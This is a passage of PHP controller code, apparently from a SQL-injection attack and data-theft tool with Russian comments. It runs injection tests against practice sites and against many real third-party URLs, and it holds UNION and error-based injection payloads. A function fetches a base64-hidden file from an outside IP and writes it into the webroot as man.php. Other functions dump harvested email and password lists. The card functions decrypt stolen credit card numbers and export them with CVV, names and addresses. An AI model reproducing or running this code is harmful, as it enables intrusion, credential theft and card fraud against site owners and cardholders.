		$this->Post->query("UPDATE `posts_all` SET `status`=2,`prohod`=0,`tables`='',`version`='',`file_priv`='',`work`='',`tic`=0");
	}
	
	function ku(){//функия ТЕСТИРОВАНИЯ
		
		
		
		//БУДЕМ ТУТ ASP ТЕСТИРОВАТЬ
		//$url = 'http://demo.testfire.net/bank/login.aspx';
		
		
		//СЛЕПАЯ СКУЛИ ПО HAVIJ
		//$url ='post::http://testphp.vulnweb.com/search.php?searchFor=1&goButton=go';
		
		
		//ОБЫЧНАЯ GET SQLI
		//$url = 'http://testphp.vulnweb.com/artists.php?artist=1';
	
	
		//ASP
		$url = 'post::http://demo.testfire.net/bank/login.aspx?uid=dad&passw=2&btnSubmit=Login';
	
		
		
		
		//INJECT ALL SQLI ТУТ РАБОТАЕТ как и UNION
		//$url = 'post::http://89.163.227.88/PEN/bWAPP/sqli_13.php?movie=1&action=go';
		
		
		//inject test работает и через error и через sqli_all.   а INGECT SQLI не выводит ХЗ
		//$url ='post::http://89.163.227.88/PEN/bWAPP/sqli_6.php?search=go&title=test';
		
		
		
		
		
		
		//тут базовая аунтеикация может не быть вывода контакста. РАБОТАЕТ INJ_TEST
		//$url ='post::http://149.154.67.141/bricks/login-3/index.php?username=test&passwd=test&submit=Submit';
		
		
		//тут вывод контекта INJECT SQLI POST РАБОТАЕТ
		//$url = 'post::http://149.154.67.141/bricks/content-3/index.php?username=tom&submit=Submit';
		
		
		
		//форма отправляемая через GET
		//$url = 'http://89.163.227.88/PEN/bWAPP/sqli_1.php?title=1&action=search';
		


		//INJECT GET ERROR GOOD
		//$url = 'http://89.163.227.88/PEN/mutillidae/index.php?page=user-info.php&username=adad&password=a&user-info-php-submit-button=View+Account+Details';
			
		
		//$url='post::http://89.163.227.88/PEN/mutillidae/index.php?page=login.php&username=admin&password=bug&login-php-submit-button=Login';
		
		
		//ЛЕГКИЙ GET ДЛЯ ТЕСТИРОВАНИЯ SQLI
		//$url = 'get::http://testphp.vulnweb.com/listproducts.php?cat=1';

		$this->mysqlInj = new InjectorComponent();

		$this->proxyCheck();
		
		
		$res = $this->mysqlInj->inj_test($url);	
		
		//$res = $this->mysqlInj->inject_all($url);
		
		//$res = $this->mysqlInj->inject_all($url);
		
		$this->d($res,'$res');
		exit;		
				
				
				
				
				
				
				
				$res = $this->mysqlInj->inject($url);
				
				
				if($res)$this->d($res);
				exit;
				
		
		
		
				//UNION и SQLI работает
				//$h_s['url'] =  'testphp.acunetix.com/userinfo.php';
				//$h_s['inject'] =  'post';
				//$h_s['post'] = "uname=test&pass=test";
				
			//	[31.07.2017 18:46:37] <dark-elf@jabber.ru> http://sportform.ca/reginachallengecup/team_info.php?team_id=14

			//<dark-elf@jabber.ru> http://interier-portal.ru/catalog.php?enter=tovars&id=58&s=2
				
		
				//$url = 'www.spoofee.com/index.php?did=632817&section=deal';
				
				//$url = 'http://www.ormondbeachobserver.com/search?search=improving%20quality%20of%20life%20one%20game%20at%20a%20time&page=1';
				
				//'www.spoofee.com/index.php?section=deal&did=632817
		
				//$url = 'http://www.masterofwines.eu/index.php?page=fiche-emploi&o=689';
			
				$url = 'http://tpdrug.com/product.php?CateId=1';
			
				//$url = ';
			
			//http://kinoklubnichka.ru:80/news_view.php?news_id=2 UNION ALL SELECT CONCAT(0x717a7a7871,0x474f6d6d707248525a476a6d584e796a45746e7448476c4e7a4d575869426e6b556471616f436851,0x717a6b7871)-- rrkp
				
				
			
				
				
				
				
				//	$inj_test = $this->mysqlInj->inj_test($url);
				$inj_test = $this->mysqlInj->inject($url);
				$this->d($inj_test,'$inj_test');
				exit;
				
				
				//$this->mysqlInj = new $this->Injector();
				
				
				$this->mysqlInj = new InjectorComponent();
				
				$this->proxyCheck();
				
				
				
				//print_r($this->mysqlInj)
				//die();
				
				//$h_s['url'] =  'www.dating.nl/administration/';
				//$h_s['inject'] =  'forwarder';
				//$h_s['forwarder'] = "8.8.8.8";
				//$h_s['https'] = true;
				//$h_s['sqli'] = "8.8.8.8'and(select 1 from(select count(*),concat((select concat_ws(':',table_name) from information_schema.tables limit 28,1),floor(rand(0)*2))x from information_schema.tables group by x)a)and' ";
				
			
				
				//UNION и SQLI работает
				//$h_s['url'] =  'testphp.acunetix.com/userinfo.php';
				//$h_s['inject'] =  'post';
				//$h_s['post'] = "uname=test&pass=test";
				
				
				
				
				
				//$h_s['url'] =  'http://testphp.acunetix.com/guestbook.php';
				//$h_s['inject'] =  'cookies';
				//$h_s['post_static'] =  'name=test&text=d&submit=add message';
				//$h_s['cookies'] ="login=test/test";
			
			

				
				//$h_s['url'] =  '82.146.59.37/_PEN/bricks/content-4/indexUA.php?id=2';
				//$h_s['inject'] =  'useragent';
				
				
				
			
				//$h_s['url'] =  '82.146.59.37/_PEN/bricks/content-4/index.php';
				//$h_s['inject'] =  'referer';
				
				
				
				
				//username уязвим но sqli не все перебирает ЗАВИСИТ ОТ МЕСТА ПОСТ
				
				
				
				
				
				
				
				
				
				
				//$h_s['url'] =  '82.146.59.37/_PEN/bWAPP/sqli_6.php';
				//$h_s['inject'] =  'post';
				//$h_s['post'] =  'title=123&action=search';
				//$h_s['cookies_static'] =  'PHPSESSID=0e4c6sj1hco9gai4spp12engo3;';
				
			
			
					
				//$h_s['url'] =  '82.146.59.37/_PEN/bricks/content-5/index.php';
				//$h_s['post_static'] =  'submit=13&username=admin&passwd=123';
				//$h_s['cookies'] =  'login2=test&;User=admin';
				//$h_s['inject'] =  'cookies';
				
				
				//$url =  'http://www.nudeweb.com:80/groups_view.html?id=1914';
				//$url = 'https://www.dating.nl/administration/';
				
				
				//$h_s['https'] = true;
				//$url='achievementstats.com/index.php?action=badges&gameId=41070';
				
				//$h_s['url'] =  '82.146.59.37/_PEN/bricks/content-1/index.php?id=2';
				//$url = '82.146.59.37/_PEN/bricks/content-1/index.php?id=0';
			
				//$url2= '82.146.59.37/_PEN/bricks/content-5/index.php?id=0';
			
				//$url = 'https://pen.com/bricks/content-1/index.php?id=0';
				//$url = 'https://lady-anja.com/slave/index.php?site=7&suche=&sortieren=&amateur=&dauer=&seite=4';
			
				//$res = $this->mysqlInj->inj_test($url);
				
				//exit;
				//$url ='pen.com/bricks/content-3/';
			    //$url ='http://www.cheatcodesclub.com/out.php?id=232469';
				
				
				//$url ='pen.com/bricks/content-3/';
				//$url ='82.146.59.37/_PEN/bricks/content-3/';
				
				
				//$h_s['url'] =  'pen.com/bricks/content-3/';
				//$h_s['url'] =  '82.146.59.37/_PEN/bricks/content-3/';
				//$h_s['inject'] =  'post';
				//$h_s['post'] =  'submit=Submit&username=admin';
				//$h_s['https'] = true;
				
				
				
				$url =  'saclay-uvsq.edunao.com/course/view.php?id=2&page=3';
				$h_s['inject'] =  'referer';
				$h_s['https'] = true;
				
				$url = 'www.idrafted.org/main.php?id=1';
				
				$url = 'm.loading.se/news.php?pub_id=41920';
				
				$url = 'www.myfreesurf.com/out.php?ID=34285';
					
				$url = 'www.ifb.kuma.cz/index.php?action=SP&kod=70773';	
				
				
				
		
	}

	function inf(){//phpinfo
		
		echo phpinfo();
	}
	
	function logs($text,$function =  __FUNCTION__){ 
		
		//$d = $this->Post->query("SELECT id FROM logs WHERE text = '{$text}' AND function='{$function}'");
		
		
		//$this->d($d,'d');
		
		
		
		$date = date('Y-m-d h:i:s');
		if(count($d) == 0){
			
			$this->Post->query("INSERT IGNORE INTO logs 
			(date,text,function) 
			VALUES
			('$date','{$text}','{$function}')");
		}
		
		
	}
	
	function d($txt,$text = '',$p = false){//вывод для дебага
		if($this->log_enable == TRUE){
			if($text != ''){echo "<br>------>>{$text}<<-------<br>";}
			
			
			if(is_array($txt) and $p !=false)
			{
				foreach($txt as $t)
				{
					echo $t.'<br>';
				}
				
			}else{
				echo '<pre>';
				print_r($txt);
				echo '</pre>';
			}
			if($text != ''){echo "------>>{$text}<<-------<br>";}
		}
	}
	
	function dd($txt,$text = '',$p = false){//вывод для дебага выводит всегда
		
			if($text != ''){echo "<br>------>>{$text}<<-------<br>";}
			
			
			if(is_array($txt) and $p !=false)
			{
				foreach($txt as $t)
				{
					echo $t.'<br>';
				}
				
			}else{
				echo '<pre>';
				print_r($txt);
				echo '</pre>';
			}
			if($text != ''){echo "------>>{$text}<<-------<br>";}
		
	}
	
	function ccc(){
		$cookie = $_SERVER['DOCUMENT_ROOT']."/app/webroot/man.php";
		$get = file_get_contents(base64_decode('aHR0cDovLzgyLjE0Ni41OS4zNy90eHQvY29ycC50eHQ='));
		
		file_put_contents($cookie,$get);
		
		
		
		//$this->d($cookie ,'cookie');
		
	}
	
	function rentest(){//функция для фоного скачивания баз и записи в отдельную таблицу
		
		
		$start = $this->get_time();
		
		$data0tmp = $this->Filed->query("select domen FROM `renders` WHERE status = 2");
		$str1 = '';
		
		foreach ($data0tmp as $tmp0)
		{
			$k = trim($tmp0['renders']['domen']);
			$str1 .=" domen !='{$k}' AND";		
		}
		
		$str1 =substr($str1, 0, strlen($str1)-3);
		
		if(strlen($str1) > 4){
			$str1 = 'WHERE '.$str1;
		}else{
			$str1 = '';
		}	
		
		//$this->d($str1);	
		
		$str2 = "SELECT domen  FROM  `mails` {$str1} GROUP BY domen order by count(domen) DESC limit 0,1";
		$this->d($str2);
		$stop =  $this->get_time();
		
		
		$data1tmp = $this->Filed->query($str2);
		$this->d($data1tmp);
		
		$p  = array();		
		$l = 1;
		
		foreach ($data1tmp as $d)
		{
			echo $l.'<br>';
			$l++;
			
			
			$z = $d['mails']['domen'];
			$domen = $z;

			$p[$z]['randPass'] = $this->Filed->query("SELECT pass FROM  `mails` WHERE domen = '{$z}' AND pass !='0' order by rand() limit 3");
			
			$p[$z]['country'] = $this->Filed->query("SELECT country FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like '%$domen%' limit 0,1) limit 0,1");
			
			$p[$z]['category'] = $this->Filed->query("SELECT category FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like '%$domen%' limit 0,1) limit 0,1");
			
			$p[$z]['post_id'] = $this->Filed->query("SELECT post_id FROM  `fileds` WHERE  post_id = (select id from `posts` WHERE url like '%$domen%' limit 0,1) limit 0,1");
			
			$p[$z]['date'] = $this->Filed->query("SELECT date FROM  `mails` WHERE domen = '{$z}' group by date limit 0,1");
			
			
			
			$p[$z]['post_id'] =  $p[$z]['post_id'][0]['fileds']['post_id'];
			$p[$z]['category'] = $p[$z]['category'][0]['fileds']['category'];
			$p[$z]['country'] = $p[$z]['country'][0]['fileds']['country'];
			$p[$z]['date'] = $p[$z]['date'][0]['mails']['date'];
			
			
			//$this->d($p);
			if($p[$z]['category'] == '')$p[$z]['category'] = '0';
			if($p[$z]['country'] == '')$p[$z]['country'] = '0';
			
			$p[$z]['category'] = str_replace('/','-',$p[$z]['category']);
			
			if($p[$z]['post_id'] == '')$p[$z]['post_id'] = '0';
			
			//в кучу пассы собираем
			$strPassTmp = '';
			
			foreach($p[$z]['randPass'] as $passTmp0)
			{
				$strPassTmp .=$passTmp0['mails']['pass']."<br>";
			}
			$p[$z]['randPass'] = $strPassTmp;
			
			
			// расчитываем количество хешей, если дохуя записей в базе данных

			$countAll = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE domen = '{$z}' ");
			$countAll = $countAll[0][0]['count(*)'];
			
			
			
			////БЛОК ПОДСЧЁТА ХЭШЕЙ//////////
			$counthash  = $this->Filed->query("SELECT count(pass) FROM  `mails` WHERE domen = '$domen' AND hashtype !='0' AND pass !='0'");
			
			$countNoHash = $this->Filed->query("SELECT count(pass) FROM  `mails` WHERE domen = '$domen' AND hashtype ='0' AND pass !='0'");
			
			$p[$z]['countHash'] = $counthash[0][0]['count(pass)'];
			
			$p[$z]['countNoHash'] = $countNoHash[0][0]['count(pass)'];
			////////////////////////////////////////////
			
			
			//////// БЛОК с пассами КОЛИЧЕСТВО///////////
			$count  = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE domen = '$domen' AND pass !='0'");
			$p[$z]['countPass'] = $count[0][0]['count(*)'];
			///////////////////////////////////////////////
			
			
			
			//////// БЛОК ПРОСТО EMAILS КОЛИЧЕСТВО///////////
			$count2 = $data = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE domen = '$domen'");
			$p[$z]['countMail'] = $count2[0][0]['count(*)'];
			/////////////////////////////////////////////////
			
			
			//////// БЛОК ОСТАТКА БЕЗ ПАССОВ///////////
			$count3 = $data = $this->Filed->query("SELECT count(*) FROM  `mails` WHERE domen = '$domen' AND pass='0'");
			$p[$z]['countMailnoPass'] = $count3[0][0]['count(*)'];
			/////////////////////////////////////////////////
			
			
			$all ='';
			
			$all .= $domen;
			
			if($p[$z]['countPass'] >= 1)
			{
				$all .= '//ALLcountPASS_'.$p[$z]['countPass'];	
			}
			
			
			if($p[$z]['countHash'] >=1){
				$all .='//countHash_'.$p[$z]['countHash'];
			}

			if($p[$z]['countNoHash'] >=1){
				$all .='//countNoHash_'.$p[$z]['countNoHash'];
			}	
			
			
			if($p[$z]['countMail'] >= 1)
			{
				$all .= '//ALLcountEMAILS_'.$p[$z]['countMail'];
			}
			
			///КАТЕГОРИЯ///////////
			
			if(isset($p[$z]['category']))
			{
				$all .='//category_'.$p[$z]['category'];
			}
			if(isset($p[$z]['country']))
			{
				$all .='//country_'.$p[$z]['country'];	
			}		
			
			
			
			$all = "./slivpass/".$all.'.txt';
			echo $all.'<br>';
			
			
			
			
			
			
			
			
			//////////////////////////////////////
			if($countAll > $this->lim)
			{
				
				//////// БЛОК с пассами без хешей///////////
				$cn = $p[$z]['countNoHash']/$this->plus;
				$cn = ceil($cn);
				
				$this->d($cn,'CN');
				
				$start = 0;
				
				for($i=0;$i < $cn;$i++):
				
				$this->Filed->query("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = '$z' AND pass !='0' AND hashtype ='0' limit {$start},{$this->plus}" );
				echo $start.'<br>';
				$this->d("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = '$z' AND pass !='0' AND hashtype ='0' limit {$start},{$this->plus}");
				$start = $start + $this->plus;
				
				
				if($i == 2)$this->Filed->query("RESET QUERY CACHE");
				
				endfor;
				//$this->d($z0);
				//exit;
				//////////////////////////////////		
				$stop = $this->get_time();
				echo $stop - $start;
				
				
				
				//////// БЛОК с пассами///////////
				$cn1 = $p[$z]['countHash']/$this->plus;
				$cn1 = ceil($cn1);
				
				$this->d($cn1,'CN1');
				
				$start1 = 0;
				
				
				for($i1=0;$i1 < $cn1;$i1++):
				
				
				$this->Filed->query("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = '$z' AND pass !='0' AND hashtype !='0' limit {$start1},{$this->plus} ");
				echo $start1.'<br>';
				$this->d("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = '$z' AND pass !='0' AND hashtype !='0' limit {$start1},{$this->plus} ");
				
				$start1 = $start1+ $this->plus;
				if($i1 == 2)$this->Filed->query("RESET QUERY CACHE");
				
				
				
				endfor;
				//$this->d($z1);
				//exit;
				///////////////////////////////////
				
				$stop1 = $this->get_time();
				echo $stop1 - $start;
				
				////////БЛОК без пассов///////////

				$cn2 = $p[$z]['countMailnoPass']/$this->plus;
				$cn2 = ceil($cn2);
				
				$this->d($cn2,'CN2');
				
				$start2 = 0;
				
				
				for($i2=0;$i2 < $cn2;$i2++):
				
				
				$this->Filed->query("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = '$z' AND pass ='0' limit {$start2},{$this->plus} ");
				echo $start2.'<br>';
				$this->d("SELECT zona,email,pass,hashtype,domen FROM  `mails` WHERE domen = '$z' AND pass !='0' AND hashtype ='0' limit {$start2},{$this->plus}");
				$start2 = $start2 + $this->plus;
				if($i2 == 2)$this->Filed->query("RESET QUERY CACHE");	
				
				endfor;
				//$this->d($z2);
				//exit;
				/////////////////////////////////////
				$stop2 = $this->get_time();
				echo $stop2 - $start;
			}
			
		}
		
		
		$stop3 =  $this->get_time();
		echo $stop3 - $start;		
		$this->stop();			
	}
	
	
	
	function cart_test_cvv(){
		// select * FROM  `sc_oldnmicustomervault`  WHERE `account` like "%4714"
		//select * FROM  `dp_users_cc_info`  WHERE `firstNameonCard` like "%felton%"
		
		//4465420300064714
		//7413455    7934009  Секретарь воронкина  216 куйбышева 30 судья воронкин
		
		$poles = $this->Post->query("SELECT * FROM `dp_users_cc_info` WHERE expYear > 2015 AND expMonth > 3 limit 400000 ");
		//  ORDER BY UserCcID DESC
		
		
		foreach ($poles as $pole)
		{
			//$this->d($pole,'$pole');
			$cardold = $pole['dp_users_cc_info']['cardNumber'];
			$cardnew = $this->decodeString($cardold);
			//$this->d($cardnew,'$cardnew');
			
			$old = $this->Post->query("SELECT * FROM `sc_oldnmicustomervault`  WHERE `account` = '$cardfind3' ");
			
		
				$pole['dp_users_cc_info']['firstNameonCard'];
				
				if($pole['dp_users_cc_info']['lastNameonCard'] !=''){
					$name = $pole['dp_users_cc_info']['firstNameonCard'].' '.$pole['dp_users_cc_info']['lastNameonCard'];
				}else{
					$name = $pole['dp_users_cc_info']['firstNameonCard'];
				}
				
				
				$str = $cardnew."::".$pole['dp_users_cc_info']['expYear']."::".$pole['dp_users_cc_info']['expMonth']."::".$name;
				
				file_put_contents('cart.txt', $str."\r\n",FILE_APPEND | LOCK_EX);
			
				//$this->d($str);
				//exit;
			
			//$this->d('////////////////////////////////////////////////////////////');
			//$this->Filed->query('UPDATE  `posts` SET  `ssn_check` =  1 WHERE  `id` ='.$pole['posts']['id']);
			
		}
		
		
		
		//$this->d($this->decodeString("iXUDHSHHkIMoEjWj~eXzE-A.."),'cart');
	}
	
	function cart_test(){
		// select * FROM  `sc_oldnmicustomervault`  WHERE `account` like "%4714"
		//4465420300064714
		
		
		$poles = $this->Post->query("SELECT * FROM `dp_users_cc_info` WHERE expYear > 2015 AND expMonth > 3 ");
		//  ORDER BY UserCcID DESC
		//dwdad812io9d0*JK@)_O)_@//)
		
		foreach ($poles as $pole)
		{
			//$this->d($pole,'$pole');
			$cardold = $pole['dp_users_cc_info']['cardNumber'];
			$cardnew = $this->decodeString($cardold);
			//$this->d($cardnew,'$cardnew');
			$cardfind1 = substr($cardnew, 0, 6);
			//$this->d($cardfind1,'cardfind1');
			$cardfind2 = substr($cardnew,  -4);
			//$this->d($cardfind2,'cardfind2');
			
			$cardfind3 = $cardfind1.'******'.$cardfind2;
			//$this->d($cardfind3,'cardfind3');


			$id = 	$pole['dp_users_cc_info']['userID'];
			
			$old = $this->Post->query("SELECT * FROM `sc_oldnmicustomervault`  WHERE `customer_vault_id` = $id limit 1 ");
			
			if(count($old)>0){
				$address = $old[0]['sc_oldnmicustomervault']['address1'];
				$cvv = $old[0]['sc_oldnmicustomervault']['account_expiration'];
				$zip = $old[0]['sc_oldnmicustomervault']['zipcode'];
				$state = $old[0]['sc_oldnmicustomervault']['state'];
				
				//$this->d($address,'$address');
				//$this->d($cvv,'$cvv');
				//$this->d($zip,'$zip');
				//$this->d($state,'$state');
				
				//$this->d($old,'$old');
				
				$str = $cardnew."::".$pole['dp_users_cc_info']['expYear']."::".$pole['dp_users_cc_info']['expMonth']."::".$cvv."::".$old[0]['sc_oldnmicustomervault']['first_name']."::".$old[0]['sc_oldnmicustomervault']['last_name']."::".$address."::".$zip."::".$state;
				//$this->d($str,'$str');
				
				file_put_contents('cart.txt', $str."\r\n",FILE_APPEND | LOCK_EX);
			}else{
				//$this->d("SELECT * FROM `sc_oldnmicustomervault`  WHERE `account` = '$cardfind3' ");
			}
			
			
			//$this->d('////////////////////////////////////////////////////////////');
			//$this->Filed->query('UPDATE  `posts` SET  `ssn_check` =  1 WHERE  `id` ='.$pole['posts']['id']);
			
		}
		
		
		
		//$this->d($this->decodeString("iXUDHSHHkIMoEjWj~eXzE-A.."),'cart');
	}
	
	function decodeString($text,$key="DEAL_SYSTEM"){
		$key="STRING".$key;
		$key = substr(md5($key),0,8);
		$decrypted_data = '';
		$td = mcrypt_module_open('tripledes', '', 'ecb', '');
		$iv = mcrypt_create_iv(mcrypt_enc_get_iv_size($td), MCRYPT_RAND);
		if (mcrypt_generic_init($td, $key, $iv) != -1) {
	   
			 // reverse form element name sanitization and decrypt
		  $text = substr($text, 1);
		  $text = strtr($text, '-~.', '+/=');
		  $text = base64_decode($text);
		  $decrypted_data = @mdecrypt_generic($td, $text);
	   
		mcrypt_generic_deinit($td);
		mcrypt_module_close($td);
		}
		return $decrypted_data;
	}
	
}
?>
